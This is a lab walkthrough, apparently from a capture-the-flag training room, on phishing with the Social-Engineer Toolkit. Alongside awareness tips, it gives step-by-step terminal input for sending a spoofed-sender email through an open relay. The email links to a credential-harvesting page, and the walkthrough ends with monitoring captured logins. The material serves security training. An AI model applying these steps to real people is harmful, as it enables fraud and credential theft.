# Phishing – Merry Clickmas
Learn how to use the Social-Engineer Toolkit (SET) to craft and deliver phishing emails.

## Learning Objectives
- Understand what social engineering is  
- Learn the types of phishing  
- Explore how red teams clone or create fake login pages  
- Use the Social-Engineer Toolkit (SET) to send a phishing email  

---

# Social Engineering

Social engineering refers to manipulating a human into making mistakes—such as revealing passwords, opening malicious files, or approving fraudulent transactions.

Unlike technical exploits, social engineering targets **people**, relying on psychological triggers such as:
- **Urgency**
- **Curiosity**
- **Authority**

For this reason, social engineering is often called **“human hacking.”**

---

# Phishing

Phishing is a type of social engineering where the attacker sends deceptive messages to trick users into clicking, opening, or replying.

Common phishing variants include:
- **Email phishing** (most common)
- **Smishing** – SMS phishing
- **Vishing** – Voice-call phishing
- **Quishing** – QR-code phishing
- **Social media phishing** – DM attacks

Modern phishing campaigns are highly convincing, making it difficult even for cautious users to detect them.

### Anti-Phishing Mnemonic: S.T.O.P.

**S.T.O.P. #1 – Ask yourself:**
- **S**uspicious?  
- **T**elling me to click something?  
- **O**ffering an amazing deal?  
- **P**ushing me to act now?  

**S.T.O.P. #2 – How to stay safe:**
- **S**low down — attackers exploit adrenaline.  
- **T**ype the URL yourself — avoid clicking links.  
- **O**pen nothing unexpected. Verify first.  
- **P**rove the sender — check the real email/number, not the display name.  

---

# Building the Trap

A successful phishing attack requires:
- A convincing email/message  
- A realistic-looking malicious login page or attachment  

Attackers may:
- Attach malware  
- Clone login portals  
- Use fraudulent sender identities  

Your goal is to craft something believable enough that the target interacts with it.

---

# Delivery via Social-Engineer Toolkit (SET)

SET is an open-source tool built for social engineering campaigns.  
It allows red teams to:
- Create phishing pages  
- Send phishing emails  
- Conduct mass or targeted campaigns  

Start SET with:

```bash
setoolkit
```

You'll see a menu. For phishing:
1) Social-Engineering Attacks
2) Mass Mailer Attack
3) E-Mail Attack Single Email Address

Example Terminal Flow:
```bash
root@attackbox:~# setoolkit

 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit
     
set> 1
```

Choosing 1 will display another menu with the type of social engineering attack we want to use in our attack.
In this case, we will pick Mass Mailer Attack by typing 5.

```bash
 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) PowerShell Attack Vectors
  10) Third-Party Modules

  99) Return back to the main menu.

set> 5
```

Now, we would be asked to select between two options. One option allows us to send the phishing email to a single address, while the other option enables us to send an email to many people. Here, we would select option 1, i.e., E-Mail Attack Single Email Address.

```bash
   Social Engineer Toolkit Mass E-Mailer

   There are two options on the mass e-mailer: the first is to email one person. The second option
   will allow you to import a list and send it to as many people as
   you want within that list.

   What do you want to do:

    1. E-Mail Attack Single Email Address
    2. E-Mail Attack Mass Mailer

    99. Return to the main menu.
   
set:mailer> 1
```

Now, we will have several questions to answer and various fields to fill out. The first set of questions concerns the email addresses and how the email will be routed and delivered. After each input provided, we can press Enter to get to the next question.

- Send email to: Let’s begin by targeting factory@wareville.thm
- How to deliver the email: We will choose Use your own server or open relay
- From address: We know that the guys at the toy factory communicate regularly with Flying Deer, the shipping company, so that we will use updates@flyingdeer.thm as the source email address
- From name: Let’s use the name Flying Deer
- Username for open-relay: We will leave it blank and just hit the Enter key
- Password for open-relay: We will leave it blank and just hit the Enter key
- SMTP email server address: We will deliver directly to the TBFC mail server by entering 10.66.181.119.
- Port number for the SMTP server: We leave the default value of 25 and just hit the Enter key

The next set of questions will ask if you want to send it as a high priority or attach a file.
- Flag this message as high priority: The choice is entirely up to you, depending on your knowledge of the circumstances, but we will answer with no
- Do you want to attach a file: We will answer with n
- Do you want to attach an inline file: Again, let’s answer with n

Finally, we pick an email subject and enter the message contents in plaintext or HTML.
- Email subject: We need to think of something convincing, for example, “Shipping Schedule Changes”
- Send the message as HTML or plain: We will keep the default choice of plaintext and just hit the Enter key
- Enter the body of the message, and type END (capitals) when finished: Create and type any convincing message. Make sure to include the URL http://10.66.155.210:8000 to check if the target will fall for this trick.

An example interaction is shown in the terminal below.

```bash
set:mailer>1
set:phishing> Send email to:factory@wareville.thm

  1. Use a Gmail account for your email attack.
  2. Use your own server or open relay

set:phishing>2
set:phishing> From address (ex: moo@example.com):updates@deershipping.thm
set:phishing> The FROM NAME the user will see:Deer Shipping
set:phishing> Username for open-relay [blank]:
Password for open-relay [blank]: 
set:phishing> SMTP email server address (ex. smtp.youremailserveryouown.com):10.66.181.119
set:phishing> Port number for the SMTP server [25]:  
set:phishing> Flag this message/s as high priority? [yes|no]:no
Do you want to attach a file - [y/n]: n
Do you want to attach an inline file - [y/n]: n
set:phishing> Email subject:Shipping Schedule Changes
set:phishing> Send the message as HTML or plain? 'h' or 'p' [p]:
[!] IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.
set:phishing> Enter the body of the message, type END (capitals) when finished:Dear elves, 
Next line of the body: Kindly note that there have been significant changes to the shipping schedules due to increased shipping orders.
Next line of the body: Please confirm the new schedule by visiting http://10.66.155.210:8000
Next line of the body: Best regards,
Next line of the body: Flying Deer
Next line of the body: END
[*] SET has finished sending the emails

      Press <return> to continue
```

Now, the phishing email has been successfully sent to the target.

The **"Press <return> to continue"** prompt simply means pressing the **Enter** key to restart the Social-Engineer Toolkit interface.

Next, open the terminal where your `server.py` script is running to monitor whether the target interacts with the phishing page and enters their credentials.  
> ⏳ **Note:** It may take 1–2 minutes before any captured credentials appear in the terminal. Continue observing the output.

# ⚠️ Real-World Impact
To the TBFC red team’s surprise, at least one set of valid credentials was received.  
This is alarming, as it confirms that an adversary could execute the same attack with real consequences — and may *already* have done so. If an attacker gains access using stolen credentials, they can severely disrupt the gift delivery systems.

It is crucial to verify whether such unauthorized access has occurred and take appropriate defensive actions immediately.

# ✔️ Summary

This challenge provided a hands-on introduction to how phishing works and how attackers craft convincing phishing campaigns using the **Social-Engineer Toolkit (SET)**.

### Key Takeaways

- **Social engineering fundamentals** — how attackers manipulate humans through urgency, curiosity, and authority  
- **Phishing variations** — email phishing, smishing, vishing, quishing, and social-media phishing  
- **Recognizing phishing indicators** — using S.T.O.P. techniques to evaluate suspicious messages  
- **Crafting & delivering a phishing email using the Social-Engineer Toolkit (SET)**  
  - SET was used to generate a realistic phishing email  
  - We configured sender details, SMTP routing, and message content  
- **Monitoring credential capture** — observing the attack server to verify if the target submitted credentials

Overall, this challenge demonstrates how attackers leverage **SET** to automate phishing campaigns and how defenders must understand these techniques to detect and prevent real-world attacks.

